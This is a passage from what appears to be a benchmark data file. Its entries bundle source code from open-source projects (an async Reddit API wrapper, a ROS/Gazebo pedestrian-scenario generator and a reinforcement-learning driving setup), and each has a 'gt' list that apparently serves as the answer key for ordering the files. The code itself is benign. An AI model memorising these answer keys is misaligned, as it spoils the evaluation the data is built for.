super()._update(data)\n\n            if isinstance(_data, list):\n                from ..helpers.comment_forest import CommentForest\n                self.comments = CommentForest(self._reddit, _data[1][\"data\"], self.fullname)\n        else:\n            raise ValueError(\"data is not of type 'dict' or 'list'.\")\n\n\nclass SubmissionModeration(PostModeration, NSFWableMixin, SpoilerableMixin):\n\n\n    def __init__(self, reddit: 'Reddit', submission: Submission):\n\n        super().__init__(reddit, submission)\n\n    async def sticky(self, position: int = 1, to_profile: bool = False):\n        \"\"\"\n        Sticky a submission in its subreddit.\n\n        Parameters\n        ----------\n        position : int\n            The \"slot\" the submission will be stickied to.\n        to_profile : bool\n            Whether the submission will be stickied to the user profile.\n\n        Returns\n        -------\n        resp: Dict\n            The API response JSON.\n        \"\"\"\n        return await self._reddit.post(API_PATH[\"mod_sticky\"], **{\n            \"id\": self.fullname,\n            \"num\": position,\n            \"state\": True,\n            \"to_profile\": to_profile\n        })\n\n    async def unsticky(self, to_profile: bool = False):\n\n        return await self._reddit.post(API_PATH[\"mod_sticky\"], **{\n            \"id\": self.fullname,\n            \"state\": False,\n            \"to_profile\": to_profile\n        })\n\n    async def flair(self, text: str, css_class: str = \"\"):\n\n        return await self._reddit.post(API_PATH[\"subreddit_flair\"].format(sub=self._item._data[\"subreddit\"]), **{\n            \"link\": self.fullname,\n            \"text\": text,\n            \"css_class\": css_class\n        })\n\n'aPRAW/apraw/models/reddit/more_comments.py'\n:from typing import TYPE_CHECKING, Dict, Any, List, Union\n\nfrom .comment import Comment\nfrom .submission import Submission\nfrom ..helpers.apraw_base import aPRAWBase\nfrom ..mixins.link import LinkMixin\nfrom ...const import API_PATH\n\nif TYPE_CHECKING:\n    from ...reddit import Reddit\n\n\nclass MoreComments(aPRAWBase, LinkMixin):\n\n\n    def __init__(self, reddit: 'Reddit', data: Dict[str, Any], link_id: str):\n\n        data.update(link_id=link_id)\n        super().__init__(reddit, data)\n\n        self._comments = []\n        self._ids = list(self.children)\n        self._index = 0\n\n    async def _next_batch(self):\n\n        if not self._ids:\n            return\n\n        ids = self._ids[:100]\n        self._ids = self._ids[100:]\n        resp = await self._reddit.get(API_PATH[\"morechildren\"], **{\n            \"children\": \",\".join(ids),\n            \"link_id\": self.link_id,\n            \"id\": self.id,\n            \"depth\": self.depth\n        })\n\n        from .listing import MoreChildren\n        children = MoreChildren(self._reddit, resp[\"json\"][\"data\"], [self._reddit.comment_kind, self._reddit.more_kind],\n                                self.link_id)\n        self._comments.extend(comment for comment in children)\n\n    async def parent(self) -> Union[Submission, Comment]:\n\n        return await self._reddit.info(self.parent_id)\n\n    async def fetch(self):\n\n        while self._ids:\n            await self._next_batch()\n\n    def __aiter__(self):\n\n        return self\n\n    async def __anext__(self) -> Comment:\n\n        if self._index >= len(self._comments) and not self._ids:\n            raise StopAsyncIteration\n\n        if not self._comments or self._ids:\n            await self._next_batch()\n\n        self._index += 1\n        return self._comments[self._index + 1]\n\n    async def comments(self) -> List[Union[Comment, 'MoreComments']]:\n\n        if not self._comments:\n            await self.fetch()\n\n        return self._comments\n\n'aPRAW/apraw/models/reddit/listing.py'\n:from typing import TYPE_CHECKING, Dict, Iterator, List\n\nfrom .comment import Comment\nfrom .message import Message\nfrom .more_comments import MoreComments\nfrom .submission import Submission\nfrom ..helpers.apraw_base import aPRAWBase\nfrom ..subreddit.moderation import ModAction\nfrom ..subreddit.wiki import WikipageRevision\n\nif TYPE_CHECKING:\n    from ..subreddit.subreddit import Subreddit\n    from ...reddit import Reddit\n\n\nclass Listing(aPRAWBase, Iterator):\n\n\n    CHILD_ATTRIBUTE = \"children\"\n\n    def __init__(self, reddit: 'Reddit', data: Dict, kind_filter: List[str] = None,\n                 subreddit: 'Subreddit' = None, link_id: str = \"\"):\n\n        super().__init__(reddit, data, reddit.listing_kind)\n\n        self._index = 0\n        self._subreddit = subreddit\n        self._link_id = link_id\n        self._kind_filter = kind_filter if kind_filter else []\n\n    def __len__(self) -> int:\n\n        return len(getattr(self, self.CHILD_ATTRIBUTE))\n\n    def __iter__(self) -> Iterator[aPRAWBase]:\n\n        return self\n\n    def __next__(self) -> aPRAWBase:\n\n        while True:\n            if self._index >= len(self):\n                raise StopIteration()\n            self._index += 1\n            item = self[self._index - 1]\n\n            if not self._kind_filter or (self._kind_filter and item.kind in self._kind_filter):\n                break\n\n        return item\n\n    def __getitem__(self, index: int) -> aPRAWBase:\n\n        item = getattr(self, self.CHILD_ATTRIBUTE)[index]\n\n        if isinstance(item, aPRAWBase):\n            return item\n\n        if \"page\" in item:\n            return WikipageRevision(self._reddit, item)\n        elif item[\"kind\"] == self._reddit.link_kind:\n            return Submission(self._reddit, item[\"data\"], subreddit=self._subreddit)\n        elif item[\"kind\"] == self._reddit.subreddit_kind:\n            from ..subreddit.subreddit import Subreddit\n            return Subreddit(self._reddit, item[\"data\"])\n        elif item[\"kind\"] == self._reddit.comment_kind:\n            if item[\"data\"][\"replies\"] and item[\"data\"][\"replies\"][\"kind\"] == self._reddit.listing_kind:\n                from ..helpers.comment_forest import CommentForest\n                replies = CommentForest(self._reddit, item[\"data\"][\"replies\"][\"data\"], item[\"data\"][\"link_id\"])\n            else:\n                replies = []\n            return Comment(self._reddit, item[\"data\"], subreddit=self._subreddit, replies=replies)\n        elif item[\"kind\"] == self._reddit.modaction_kind:\n            return ModAction(self._reddit, item[\"data\"], self._subreddit)\n        elif item[\"kind\"] == self._reddit.message_kind:\n            return Message(self._reddit, item[\"data\"])\n        elif item[\"kind\"] == self._reddit.listing_kind:\n            return Listing(self._reddit, item[\"data\"])\n        elif item[\"kind\"] == self._reddit.more_kind:\n            return MoreComments(self._reddit, item[\"data\"], self._link_id)\n        else:\n            return aPRAWBase(self._reddit, item[\"data\"] if \"data\" in item else item)\n\n    @property\n    def last(self) -> aPRAWBase:\n\n        return self[len(self) - 1] if len(self) > 0 else None\n\n\nclass MoreChildren(Listing):\n    CHILD_ATTRIBUTE = \"things\"\n",
        "gt": [
            "'aPRAW/apraw/models/reddit/submission.py'",
            "'aPRAW/apraw/models/reddit/more_comments.py'",
            "'aPRAW/apraw/models/reddit/listing.py'"
        ]
    },
    {
        "files": [
            "'arena-rosnav-3D/task_generator/task_generator/ped_manager/FlatlandModel.py'",
            "'arena-rosnav-3D/task_generator/scripts/generate_world.py'",
            "'arena-rosnav-3D/task_generator/task_generator/ped_manager/ArenaScenario.py'"
        ],
        "content": "'arena-rosnav-3D/task_generator/task_generator/ped_manager/FlatlandModel.py'\n:from .HelperFunctions import *\nfrom PyQt5 import QtGui, QtCore, QtWidgets\nfrom enum import Enum\nimport yaml\nimport os\nimport numpy as np\n\nclass B2BodyType(Enum):\n    DYNAMIC = 0\n    STATIC = 1\n    KINEMATIC = 2\n\n\nclass FlatlandFootprint(object):\n    def __init__(self):\n        self.layers = []\n        self.collision = True\n        self.density = 1.0\n\n    def __eq__(self, other):\n        if not isinstance(other, FlatlandFootprint):\n            return NotImplemented\n\n        return (self.layers == other.layers\n                and self.collision == other.collision\n                and np.allclose(self.density, other.density))\n\n    @staticmethod\n    def fromDict(d):\n\n        fp = FlatlandFootprint()\n\n        if d[\"type\"] == \"polygon\":\n            fp = PolygonFlatlandFootprint.fromDict(d)\n        elif d[\"type\"] == \"circle\":\n            fp = CircleFlatlandFootprint.fromDict(d)\n        else:\n            raise Exception(\"unknown footprint type.\")\n\n\n        if \"layers\" in d:\n            fp.layers = d[\"layers\"]\n        if \"collision\" in d:\n            fp.collision = d[\"collision\"]\n        if \"density\" in d:\n            fp.density = float(d[\"density\"])\n\n        return fp\n\n    def toDict(self):\n        d = {}\n        d[\"layers\"] = self.layers\n        d[\"collision\"] = self.collision\n        d[\"density\"] = self.density\n        return d\n\nclass CircleFlatlandFootprint(FlatlandFootprint):\n    def __init__(self):\n        super().__init__()\n        self.center = [0.0, 0.0]\n        self.radius = 0.5\n\n    def __eq__(self, other):\n        if not isinstance(other, CircleFlatlandFootprint):\n            return NotImplemented\n\n        return (super().__eq__(other)\n                and np.allclose(self.center, other.center)\n                and np.allclose(self.radius, other.radius))\n\n    @staticmethod\n    def fromDict(d):\n\n        fp = CircleFlatlandFootprint()\n        if \"center\" in d:\n            fp.center = [float(val) for val in d[\"center\"]]\n        if \"radius\" in d:\n            fp.radius = float(d[\"radius\"])\n        return fp\n\n    def toDict(self):\n        d = super().toDict()\n        d[\"center\"] = self.center\n        d[\"radius\"] = self.radius\n        d[\"type\"] = \"circle\"\n        return d\n\nclass PolygonFlatlandFootprint(FlatlandFootprint):\n    def __init__(self):\n        super(PolygonFlatlandFootprint, self).__init__()\n        self.points = []\n\n    def __eq__(self, other):\n        if not isinstance(other, PolygonFlatlandFootprint):\n            return NotImplemented\n\n        if len(self.points) != len(other.points):\n            return False\n\n        return (super().__eq__(other)\n                and np.allclose(self.points, other.points))\n\n    @staticmethod\n    def fromDict(d):\n\n        fp = PolygonFlatlandFootprint()\n        if \"points\" in d:\n            fp.points = [[float(point[0]), float(point[1])] for point in d[\"points\"]]\n        return fp\n\n    def toDict(self):\n        d = super().toDict()\n        d[\"points\"] = self.points\n        d[\"type\"] = \"polygon\"\n        return d\n\nclass FlatlandBody():\n    def __init__(self):\n        self.name = \"new_body\"\n        self.type = B2BodyType.DYNAMIC\n        self.color = QtGui.QColor(\"red\")\n        self.linear_damping = 0.0\n        self.angular_damping = 0.0\n        self.footprints = []\n\n    def __eq__(self, other):\n        if not isinstance(other, FlatlandBody):\n            return NotImplemented\n\n\n        return (self.name == other.name\n                and self.type == other.type\n                and self.color == other.color\n                and np.allclose(self.linear_damping, other.linear_damping)\n                and np.allclose(self.angular_damping, other.angular_damping)\n                and self.footprints == other.footprints)\n\n    @staticmethod\n    def fromDict(d):\n\n        body = FlatlandBody()\n        if \"name\" in d:\n            body.name = d[\"name\"]\n        if \"type\" in d:\n            body.type = B2BodyType[d[\"type\"].upper()]\n        if \"color\" in d:\n            rgba_values = [int(val * 255) for val in d[\"color\"]]\n            body.color = QtGui.QColor(rgba_values[0], rgba_values[1], rgba_values[2], rgba_values[3])\n        if \"linear_damping\" in d:\n            body.linear_damping = d[\"linear_damping\"]\n        if \"angular_damping\" in d:\n            body.angular_damping = d[\"angular_damping\"]\n        if \"footprints\" in d:\n            for footprint in d[\"footprints\"]:\n                body.footprints.append(FlatlandFootprint.fromDict(footprint))\n        return body\n\n    def toDict(self):\n\n        d = {}\n        d[\"name\"] = self.name\n        d[\"color\"] = [self.color.redF(), self.color.greenF(), self.color.blueF(), self.color.alphaF()]\n        d[\"type\"] = self.type.name.lower()\n        d[\"linear_damping\"] = self.linear_damping\n        d[\"angular_damping\"] = self.angular_damping\n        d[\"footprints\"] = [footprint.toDict() for footprint in self.footprints]\n        return d\n\nclass FlatlandModel(object):\n    def __init__(self):\n        super(FlatlandModel, self).__init__()\n        self.bodies = {}\n        self.path = \"\"\n        self.bodies_index = 0\n\n    def __eq__(self, other):\n        if not isinstance(other, FlatlandModel):\n            return NotImplemented\n\n        if len(self.bodies.keys()) == len(other.bodies.keys()):\n            for body1, body2 in zip(self.bodies.values(), other.bodies.values()):\n                if body1 != body2:\n                    return False\n            return True\n\n        return False\n\n    def toDict(self):\n        d = {}\n        d[\"bodies\"] = [body.toDict() for body in self.bodies.values()]\n        return d\n\n    def save(self, path_in = \"\"):\n        if path_in == \"\" and self.path == \"\":\n                return False\n        elif path_in != \"\":\n            self.path = path_in\n\n        with open(self.path, \"w\") as file:\n            data = self.toDict()\n            yaml.dump(data, file, default_flow_style=None)\n\n        print(\"saved model to\", self.path)\n        return True\n\n    def load(self, path):\n\n        if os.path.exists(path):\n            self.bodies = {}\n            with open(path, \"r\") as file:\n                data = yaml.safe_load(file)\n                for body in data[\"bodies\"]:\n                    flatland_body = FlatlandBody.fromDict(body)\n                    self.bodies[self.bodies_index] = flatland_body\n                    self.bodies_index += 1\n            self.path = path\n\nclass FlatlandObject():\n    def __init__(self, name = \"\", model_path = \"\"):\n\n        self.name = name\n        self.flatlandModel = FlatlandModel()\n        if os.path.exists(model_path):\n            self.flatlandModel.load(model_path)\n        self.pos = np.zeros(2)\n        self.angle = 0.0\n\n    @staticmethod\n    def fromDict(d):\n\n        o = FlatlandObject()\n        o.loadFromDict(d)\n        return o\n\n    def loadFromDict(self, d):\n\n        self.name = d[\"name\"]\n        self.flatlandModel.load(get_current_user_path(d[\"model_path\"]))\n        self.pos = np.array([float(val) for val in d[\"pos\"]])\n        self.angle = float(d[\"angle\"])\n\n    def toDict(self):\n        d = {}\n        d[\"name\"] = self.name\n        d[\"model_path\"] = self.flatlandModel.path\n        d[\"pos\"] = [float(val) for val in self.pos]\n        d[\"angle\"] = round(normalize_angle(self.angle), 3)\n        return d\n\n'arena-rosnav-3D/task_generator/scripts/generate_world.py'\n:\n\nimport rospkg\nimport rospy\nfrom lxml import etree\nfrom lxml.etree import Element\nfrom task_generator.ped_manager.ArenaScenario import ArenaScenario\nimport numpy as np\nimport math\n\nSTART_TIME = 0.0\n\nORIENTATION_TIME = 1.5\nSTANDART_ORIENTATION = 0.0\nactor_type = 'person'\n\ndebug = False\nrospy.init_node(\"generate_world\")\nrospack = rospkg.RosPack()\nsim_setup_path = rospack.get_path(\"simulator_setup\")\n\n\nif not debug:\n    mode = rospy.get_param(\"~task_mode\", \"staged\")\n    world_name = rospy.get_param(\"world\")\n    world_file = (\n        sim_setup_path + \"/worlds/\" + world_name + \"/worlds/\" + world_name + \".world\"\n    )\n\nelse:\n    mode = \"scenario\"\n    world_file = '/home/elias/catkin_ws/src/arena-rosnav-3D/simulator_setup/worlds/turtlebot3_world/worlds/turtlebot3_world.world'\n\n\n\ntree_ = etree.parse(world_file)\nworld_ = tree_.getroot().getchildren()[0]\n\n\nfor actor in tree_.xpath(\"//actor\"):\n    actor.getparent().remove(actor)\n\n\ndef create_trajectory_element(time, pose):\n\n    waypoint = Element(\"waypoint\")\n    t = etree.fromstring(f\"<time>{time}</time>\")\n    waypoint.append(t)\n    pose = etree.fromstring(f\"<pose> {pose} </pose>\")\n    waypoint.append(pose)\n    trajectory.append(waypoint)\n\n\ndef calculate_trajectory_time(pos_0, pos_1, max_vel):\n\n    dist = np.linalg.norm(pos_1 - pos_0)\n    return dist / max_vel\n\n\ndef create_trajectory_from_two_waypoints(start_point, end_point, traj_time, max_vel, yaw_old):\n\n    if not start_point[0] == end_point[0] or not start_point[1] == end_point[1]:\n        time = calculate_trajectory_time(start_point, end_point, max_vel)\n        if time > ORIENTATION_TIME:\n\n\n            yaw = math.atan2(end_point[1]-start_point[1],\n                             end_point[0]-start_point[0])\n            traj_time += ORIENTATION_TIME\n            if not yaw-yaw_old == 0.0:\n                pose = f\"{start_point[0]} {start_point[1]}  0.0 0.0 0.0 {yaw}\"\n                create_trajectory_element(traj_time, pose)\n\n            traj_time += time - ORIENTATION_TIME\n\n            pose = f\"{end_point[0]} {end_point[1]} 0.0 0.0 0.0 {yaw}\"\n            create_trajectory_element(traj_time, pose)\n\n            yaw_old = yaw\n        else:\n            raise NotImplementedError\n    else:\n        return traj_time, yaw_old\n\n    return traj_time, yaw_old\n\n\ndef add_actor_element_person(j, agent):\n    actor = Element(\"actor\", name=\"person_\" +\n                    str(j) + \"_\" + str(agent))\n    skin = Element(\"skin\")\n\n\n    init_pose = etree.fromstring(\n        f\"<pose> {ped.pos[0]} {ped.pos[1]} 0.0 0.0 0.0 0.0 </pose>\"\n    )\n    actor.append(init_pose)\n\n\n    skin_fn = Element(\"filename\")\n    skin_fn.text = \"model://actor/meshes/SKIN_man_green_shirt.dae\"\n    skin.append(skin_fn)\n    actor.append(skin)\n    animation = Element(\"animation\", name=\"animation\")\n    animate_fn = Element(\"filename\")\n    animate_fn.text = \"model://actor/meshes/ANIMATION_walking.dae\"\n    interpolate_x = Element(\"interpolate_x\")\n    interpolate_x.text = \"true\"\n    animate_scale = Element(\"scale\")\n    animate_scale.text = \"1\"\n    animation.append(animate_fn)\n    animation.append(interpolate_x)\n    actor.append(animation)\n    script = Element(\"script\")\n    return actor, script\n\n\ndef add_actor_element_box(j, agent):\n\n    actor = Element(\"actor\", name=\"box_\" + str(j) + \"_\" + str(agent))\n    link = Element(\"link\", name=\"link\")\n    visual = Element(\"visual\", name=\"visual\")\n    geometry = Element(\"geometry\")\n    box = Element(\"box\")\n    size = Element(\"size\")\n    size.text = \".2 .2 .2\"\n\n    script = Element(\"script\")\n    loop = Element(\"loop\")\n    loop.text = \"true\"\n    delay_start = Element(\"delay_start\")\n    delay_start.text = \"0.000000\"\n    auto_start = Element(\"auto_start\")\n    auto_start.text = \"true\"\n\n\n    box.append(size)\n    geometry.append(box)\n    visual.append(geometry)\n    link.append(visual)\n    actor.append(link)\n    script.append(loop)\n    script.append(delay_start)\n    script.append(auto_start)\n\n    return actor, script\n\n\n\nif mode in [\"scenario\", \"scenario_staged\"]:\n\n\n    if not debug:\n        scenario_path = rospy.get_param(\"~scenario_path\")\n    else:\n        scenario_path = '/home/elias/catkin_ws/src/arena-rosnav-3D/simulator_setup/scenarios/turtlebot3_world.json'\n    scenario = ArenaScenario()\n    scenario.loadFromFile(scenario_path)\n    num_of_actors = 0\n\n\n    for j, ped in enumerate(scenario.pedsimAgents):\n        for agent in range(ped.number_of_peds):\n\n\n            if actor_type == 'person':\n                actor, script = add_actor_element_person(j, agent)\n            if actor_type == 'box':\n                actor, script = add_actor_element_box(j, agent)\n\n\n            trajectory = Element(\n                \"trajectory\", id=f\"{j}_{agent}\", type=\"animation\")\n            waypoint = Element(\"waypoint\")\n            max_vel = ped.vmax\n            traj_time = START_TIME\n            yaw_old = STANDART_ORIENTATION\n            list_of_waypoints = [*ped.waypoints, ped.waypoints[0]]\n\n\n            for pos_1, pos_2 in zip(list_of_waypoints, list_of_waypoints[1:]):\n                traj_time, yaw_old = create_trajectory_from_two_waypoints(\n                    pos_1, pos_2, traj_time, max_vel, yaw_old)\n\n            script.append(trajectory)\n\n            if actor_type == 'person':\n                coll_plugin = (\n                    sim_setup_path + \"/obstacles/\" + \"utils\" + \"/collision-actor-plugin\"\n                )\n                print('IMPORTANT:', coll_plugin)\n                with open(coll_plugin) as _:\n                    collision_model = etree.fromstring(_.read())\n                actor.append(collision_model)\n\n            actor.append(script)\n            world_.append(actor)\n\n\nelse:\n    num_of_actors = rospy.get_param(\"actors\", 3)\n\n    for item in range(num_of_actors):\n        actor = Element(\"actor\", name=\"person_\" + str(item + 1))\n        s_pos = etree.fromstring(\"<pose> -0.46 20.8 0.0 0.0 0.0 1.18 </pose>\")\n        actor.append(s_pos)\n        skin = Element(\"skin\")\n        skin_fn = Element(\"filename\")\n        skin_fn.text = \"model://actor/meshes/SKIN_man_green_shirt.dae\"\n        skin_scale = Element(\"scale\")\n        skin_scale.text = \"1\"\n        skin.append(skin_fn)\n        actor.append(skin)\n        animation = Element(\"animation\", name=\"animation\")\n        animate_fn = Element(\"filename\")\n        animate_fn.text = \"model://actor/meshes/ANIMATION_walking.dae\"\n        interpolate_x = Element(\"interpolate_x\")\n        interpolate_x.text = \"true\"\n        animate_scale = Element(\"scale\")\n        animate_scale.text = \"1\"\n        animation.append(animate_fn)\n        animation.append(interpolate_x)\n        actor.append(animation)\n        plugin = Element(\"plugin\", name=\"None\",\n                         filename=\"libActorPosePlugin.so\")\n        actor.append(plugin)\n\n        coll_plugin = (\n            sim_setup_path + \"/obstacles/\" + \"utils\" + \"/collision-actor-plugin\"\n        )\n        with open(coll_plugin) as _:\n            collision_model = etree.fromstring(_.read())\n\n        actor.append(collision_model)\n\n        world_.append(actor)\n\n\ntree_.write(world_file, pretty_print=True,\n            xml_declaration=True, encoding=\"utf-8\")\n\n'arena-rosnav-3D/task_generator/task_generator/ped_manager/ArenaScenario.py'\n:import numpy as np\nimport os, rospkg\nimport yaml\nimport json\nfrom .PedsimAgent import *\nfrom .FlatlandModel import *\nfrom .HelperFunctions import *\n\n\nclass ArenaScenario:\n    def __init__(self):\n        self.pedsimAgents = []\n        self.interactiveObstacles = []\n        self.staticObstacles = []\n        self.robotPosition = np.zeros(2)\n        self.robotGoal = np.zeros(2)\n        self.mapPath = \"\"\n        self.resets = 0\n        self.path = \"\"\n\n    def toDict(self):\n        d = {}\n\n        d[\"pedsim_agents\"] = [a.toDict() for a in self.pedsimAgents]\n        d[\"static_obstacles\"] = [o.toDict() for o in self.staticObstacles]\n\n        d[\"robot_position\"] = [float(value) for value in self.robotPosition]\n        d[\"robot_goal\"] = [float(value) for value in self.robotGoal]\n        d[\"resets\"] = self.resets\n        d[\"map_path\"] = self.mapPath\n        d[\"format\"] = \"arena-tools\"\n\n        return d\n\n    @staticmethod\n    def fromDict(d):\n\n        scenario = ArenaScenario()\n        scenario.loadFromDict(d)\n        return scenario\n\n    def loadFromDict(self, d):\n\n        self.pedsimAgents = [PedsimAgent.fromDict(a) for a in d[\"pedsim_agents\"]]\n        self.staticObstacles = [\n            FlatlandObject.fromDict(o) for o in d[\"static_obstacles\"]\n        ]\n\n        self.robotPosition = np.array([d[\"robot_position\"][0], d[\"robot_position\"][1]])\n        self.robotGoal = np.array([d[\"robot_goal\"][0], d[\"robot_goal\"][1]])\n        self.mapPath = get_current_user_path(d[\"map_path\"])\n        if (\"resets\") in d.keys():\n            self.resets = d[\"resets\"]\n        else:\n            self.resets = 0\n\n    def saveToFile(self, path_in=\"\"):\n\n        \"\"\"\n        Save Scenario in file.\n        - path_in: path to save file\n        - format: format of save file, can be \"json\" or \"yaml\"\n        \"\"\"\n        if os.path.exists(path_in):\n            self.path = path_in\n\n        if self.path == \"\":\n            return False\n\n        _, file_extension = os.path.splitext(self.path)\n        with open(self.path, \"w\") as file:\n            data = self.toDict()\n            if file_extension == \".json\":\n                json.dump(data, file, indent=4)\n            elif file_extension == \".yaml\":\n                yaml.dump(data, file, default_flow_style=None)\n            else:\n                raise Exception(\n                    \"wrong format. file needs to have 'json' or 'yaml' file ending.\"\n                )\n\n        return True\n\n    def loadFromFile(self, path_in):\n\n        if os.path.exists(path_in):\n            _, file_extension = os.path.splitext(path_in)\n            with open(path_in, \"r\") as f:\n                data = None\n                if file_extension == \".json\":\n                    data = json.load(f)\n                elif file_extension == \".yaml\":\n                    data = yaml.safe_load(f)\n                else:\n                    raise Exception(\n                        \"wrong format. file needs to have 'json' or 'yaml' file ending.\"\n                    )\n\n                self.loadFromDict(data)\n                self.path = path_in\n\n        else:\n            raise Exception(\"file \", path_in, \" does not exist\")\n\n    def createSimplePed(self, ids, s_pos, w_pos):\n\n\n\n        peds = []\n        for id, spos, wpos in zip(ids, s_pos, w_pos):\n            peds.append(\n                {\n                    \"name\": \"Pedestrian\",\n                    \"id\": id,\n                    \"pos\": [*spos],\n                    \"type\": \"adult\",\n                    \"yaml_file\": \"/home/daniel/catkin_ws/src/arena-rosnav-3D/simulator_setup/dynamic_obstacles/person_two_legged.model.yaml\",\n                    \"number_of_peds\": 1,\n                    \"vmax\": 0.3,\n                    \"start_up_mode\": \"default\",\n                    \"wait_time\": 0.0,\n                    \"trigger_zone_radius\": 0.0,\n                    \"chatting_probability\": 0.01,\n                    \"tell_story_probability\": 0,\n                    \"group_talking_probability\": 0.01,\n                    \"talking_and_walking_probability\": 0.01,\n                    \"requesting_service_probability\": 0.01,\n                    \"requesting_guide_probability\": 0.01,\n                    \"requesting_follower_probability\": 0.01,\n                    \"max_talking_distance\": 5,\n                    \"max_servicing_radius\": 5,\n                    \"talking_base_time\": 10,\n                    \"tell_story_base_time\": 0,\n                    \"group_talking_base_time\": 10,\n                    \"talking_and_walking_base_time\": 6,\n                    \"receiving_service_base_time\": 20,\n                    \"requesting_service_base_time\": 30,\n                    \"force_factor_desired\": 1,\n                    \"force_factor_obstacle\": 1,\n                    \"force_factor_social\": 5,\n                    \"force_factor_robot\": 1,\n                    \"waypoints\": [[*spos], [*wpos]],\n                    \"waypoint_mode\": 0,\n                }\n            )\n\n\n        path = (\n            rospkg.RosPack().get_path(\"simulator_setup\")\n            + \"/scenarios/utils/empty_ped_scenario.json\"\n        )\n\n        if os.path.exists(path):\n            _, file_extension = os.path.splitext(path)\n            with open(path, \"r\") as f:\n                data = json.load(f)\n\n        data[\"pedsim_agents\"] = peds\n        self.loadFromDict(data)\n",
        "gt": [
            "'arena-rosnav-3D/task_generator/task_generator/ped_manager/FlatlandModel.py'",
            "'arena-rosnav-3D/task_generator/task_generator/ped_manager/ArenaScenario.py'",
            "'arena-rosnav-3D/task_generator/scripts/generate_world.py'"
        ]
    },
    {
        "files": [
            "'BehaviorMetrics/behavior_metrics/brains/gazebo/f1/brain_f1_follow_line_ddpg.py'",
            "'BehaviorMetrics/behavior_metrics/brains/gazebo/f1/rl_utils/algorithms/ppo_f1.py'",
            "'BehaviorMetrics/behavior_metrics/brains/gazebo/f1/rl_utils/algorithms/__init__.py'",
            "'BehaviorMetrics/behavior_metrics/brains/gazebo/f1/rl_utils/inference.py'"
        ],
        "content": "'BehaviorMetrics/behavior_metrics/brains/gazebo/f1/brain_f1_follow_line_ddpg.py'\n:\nimport tensorflow as tf\nfrom gym.envs.registration import register\nfrom brains.gazebo.f1.rl_utils.inference import InferencerWrapper\nimport yaml\nimport gym\nimport numpy as np\nimport time\n\n\nif 'F1Env-v0' not in gym.envs.registry.env_specs:\n    gym.envs.register(\n        id='F1Env-v0',\n        entry_point='brains.gazebo.f1.rl_utils.models:F1Env',\n\n    )\nelse:\n    print(\"Environment F1Env-v0 is already registered.\")\n\n\n\n\nclass LoadEnvVariablesDDPGGazebo:\n\n\n    def __init__(self, config) -> None:\n\n        self.environment_set = config[\"settings\"][\"environment_set\"]\n        self.env = config[\"settings\"][\"env\"]\n        self.agent = config[\"settings\"][\"agent\"]\n        self.states = config[\"settings\"][\"states\"]\n        self.actions = config[\"settings\"][\"actions\"]\n        self.actions_set = config[\"actions\"][self.actions]\n        self.rewards = config[\"settings\"][\"rewards\"]\n\n        self.environment = {}\n        self.environment[\"agent\"] = config[\"settings\"][\"agent\"]\n        self.environment[\"algorithm\"] = config[\"settings\"][\"algorithm\"]\n        self.environment[\"task\"] = config[\"settings\"][\"task\"]\n        self.environment[\"framework\"] = config[\"settings\"][\"framework\"]\n        self.environment[\"model_state_name\"] = config[self.environment_set][self.env][\n            \"model_state_name\"\n        ]\n\n        self.environment[\"mode\"] = config[\"settings\"][\"mode\"]\n        self.environment[\"retrain_ddpg_tf_actor_model_name\"] = config[\"retraining\"][\n            \"ddpg\"\n        ][\"retrain_ddpg_tf_actor_model_name\"]\n        self.environment[\"retrain_ddpg_tf_critic_model_name\"] = config[\"retraining\"][\n            \"ddpg\"\n        ][\"retrain_ddpg_tf_critic_model_name\"]\n        self.environment[\"inference_ddpg_tf_actor_model_name\"] = config[\"inference\"][\n            \"ddpg\"\n        ][\"inference_ddpg_tf_actor_model_name\"]\n        self.environment[\"inference_ddpg_tf_critic_model_name\"] = config[\"inference\"][\n            \"ddpg\"\n        ][\"inference_ddpg_tf_critic_model_name\"]\n\n\n        self.environment[\"env\"] = config[\"settings\"][\"env\"]\n        self.environment[\"circuit_name\"] = config[self.environment_set][self.env][\n            \"circuit_name\"\n        ]\n        self.environment[\"launchfile\"] = config[self.environment_set][self.env][\n            \"launchfile\"\n        ]\n        self.environment[\"environment_folder\"] = config[self.environment_set][self.env][\n            \"environment_folder\"\n        ]\n        self.environment[\"robot_name\"] = config[self.environment_set][self.env][\n            \"robot_name\"\n        ]\n        self.environment[\"estimated_steps\"] = config[self.environment_set][self.env][\n            \"estimated_steps\"\n        ]\n        self.environment[\"alternate_pose\"] = config[self.environment_set][self.env][\n            \"alternate_pose\"\n        ]\n        self.environment[\"sensor\"] = config[self.environment_set][self.env][\"sensor\"]\n        self.environment[\"gazebo_start_pose\"] = [\n            config[self.environment_set][self.env][\"circuit_positions_set\"][0]\n        ]\n        self.environment[\"gazebo_random_start_pose\"] = config[self.environment_set][\n            self.env\n        ][\"circuit_positions_set\"]\n        self.environment[\"telemetry_mask\"] = config[self.environment_set][self.env][\n            \"telemetry_mask\"\n        ]\n        self.environment[\"telemetry\"] = config[self.environment_set][self.env][\n            \"telemetry\"\n        ]\n\n\n        self.environment[\"height_image\"] = config[\"agent\"][self.agent][\n            \"camera_params\"\n        ][\"height\"]\n        self.environment[\"width_image\"] = config[\"agent\"][self.agent][\"camera_params\"][\n            \"width\"\n        ]\n        self.environment[\"center_image\"] = config[\"agent\"][self.agent][\n            \"camera_params\"\n        ][\"center_image\"]\n        self.environment[\"image_resizing\"] = config[\"agent\"][self.agent][\n            \"camera_params\"\n        ][\"image_resizing\"]\n        self.environment[\"new_image_size\"] = config[\"agent\"][self.agent][\n            \"camera_params\"\n        ][\"new_image_size\"]\n        self.environment[\"raw_image\"] = config[\"agent\"][self.agent][\"camera_params\"][\n            \"raw_image\"\n        ]\n        self.environment[\"num_regions\"] = config[\"agent\"][self.agent][\"camera_params\"][\n            \"num_regions\"\n        ]\n        self.environment[\"lower_limit\"] = config[\"agent\"][self.agent][\"camera_params\"][\n            \"lower_limit\"\n        ]\n\n        self.environment[\"states\"] = config[\"settings\"][\"states\"]\n        self.environment[\"x_row\"] = config[\"states\"][self.states][0]\n\n\n        self.environment[\"action_space\"] = config[\"settings\"][\"actions\"]\n        self.environment[\"actions\"] = config[\"actions\"][self.actions]\n\n\n        self.environment[\"reward_function\"] = config[\"settings\"][\"rewards\"]\n        self.environment[\"rewards\"] = config[\"rewards\"][self.rewards]\n        self.environment[\"min_reward\"] = config[\"rewards\"][self.rewards][\"min_reward\"]\n\n\n        self.environment[\"critic_lr\"] = config[\"algorithm\"][\"ddpg\"][\"critic_lr\"]\n        self.environment[\"actor_lr\"] = config[\"algorithm\"][\"ddpg\"][\"actor_lr\"]\n        self.environment[\"model_name\"] = 